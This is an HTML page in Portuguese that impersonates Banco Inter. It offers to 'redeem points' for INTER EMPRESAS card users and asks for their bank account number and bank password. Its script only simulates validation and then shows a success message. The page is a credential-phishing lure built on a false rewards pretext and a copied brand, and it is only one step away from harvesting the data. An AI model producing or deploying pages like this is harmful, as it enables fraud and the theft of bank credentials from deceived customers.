<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INTER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
            flex-direction: column;
        }

        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
            box-sizing: border-box;
            border: 2px solid #ff7a00;
            border-radius: 40px;
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(51, 130, 13, 0.1), 0 -4px 8px rgba(51, 130, 13, 0.1);
            text-align: center;
        }

        .formulario {
            width: 100%;
            padding: 20px;
            border: 2px solid #ff7a00;
            border-radius: 40px;
            margin-top: 20px;
            text-align: left;
            background-color: #fff;
            box-sizing: border-box;
            box-shadow: 0 4px 8px rgba(51, 130, 13, 0.1), 0 -4px 8px rgba(51, 130, 13, 0.1);
        }

        label {
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
            display: inline-block;
            margin-left: 10px;
        }

        .icon {
            margin-right: 5px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-top: 5px;
            border: 2px solid #ff7a00;
            border-radius: 40px;
            font-size: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background-color: #ff7a00;
            border: none;
            border-radius: 40px;
            font-size: 16px;
            cursor: pointer;
            color: #fff;
        }

        button:hover {
            background-color: #ff7a00;
        }

        button:focus {
            outline: none;
        }

        footer {
            margin-top: 30px;
            font-size: 12px;
            color: #666;
        }

        .loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            color: #ff7a00;
            display: none;
        }

        .senha {
            display: none;
            margin-top: 20px;
            text-align: left;
        }

        .hidden {
            display: none;
        }

        .inicio-texto, .imagem, .sub-texto {
            display: block;
        }

        .sucesso {
            display: none;
            padding: 40px;
            background-color: #ff7a00;
            color: white;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            margin-top: 30px;
            width: 80%;
            margin-left: auto;
            margin-right: auto;
            box-shadow: 0 4px 10px rgba(51, 130, 13, 0.2);
        }

        .sucesso img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }

        .verde {
            color: #ff7a00;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
                max-width: 100%;
            }

            .formulario {
                padding: 15px;
                border-radius: 20px;
            }

            footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="inicio-texto" id="inicioTexto">
            <p> Resgate <span class="verde">seus pontos</span> acumulados por utilizar o Cartão <span class="verde">INTER EMPRESAS</span></p>
            <p>Se usou seu cartão <span class="verde">INTER</span> para compras entre <span class="verde">2022</span> e <span class="verde">2024</span>, insira os dados abaixo:</p>
        </div>

        <div class="formulario">
            <p><span class="icon"><i class="fas fa-user"></i></span> Conta do Banco:</p>
            <input type="text" id="conta" placeholder="Número da conta"><br><br>
            <p><span class="icon"><i class="fas fa-lock"></i></span> Senha do Banco:</p>
            <input type="password" id="senha" placeholder="Senha"><br><br>

            <button onclick="validarConta()">Confirmar</button>
        </div>

        <div class="sucesso hidden" id="sucesso">
            <p>Seu resgate foi confirmado com sucesso!</p>
        </div>

        <div class="loading-spinner" id="loadingSpinner">
            <i class="fas fa-spinner fa-spin"></i>
        </div>

    </div>

    <footer>
        <p><span class="verde">© 2025 Banco Inter S.A.</span> Todos os direitos reservados</p>
    </footer>

    <script>
        function validarConta() {
            let conta = document.getElementById("conta").value;
            let senha = document.getElementById("senha").value;

            if (conta && senha) {
                document.getElementById("loadingSpinner").style.display = "block";
                
                // Simula a validação da conta
                setTimeout(() => {
                    document.getElementById("loadingSpinner").style.display = "none";
                    document.getElementById("sucesso").style.display = "block";
                    document.getElementById("inicioTexto").style.display = "none";
                    document.getElementById("formulario").style.display = "none";
                }, 3000);  // Simula 3 segundos de espera

            } else {
                alert("Preencha todos os campos!");
            }
        }
    </script>

</body>
</html>
